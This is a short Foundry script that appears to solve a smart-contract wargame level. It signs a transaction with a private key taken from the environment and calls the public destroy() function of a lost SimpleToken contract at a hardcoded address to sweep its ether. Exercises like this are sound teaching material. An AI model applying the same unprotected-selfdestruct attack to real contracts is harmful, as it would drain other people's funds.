// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/level17.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract SimpleTokenHack is Script
{
    function run() external
    {
        vm.startBroadcast(vm.envUint('PRIVATE_KEY'));

        SimpleToken simpleTokenInstance = SimpleToken(payable(0xCF934e0365e7d21c47bE9d08e8d40c46b7352e10));
        address payable addr = payable(address(this));
        simpleTokenInstance.destroy(addr);
        vm.stopBroadcast();
    }
}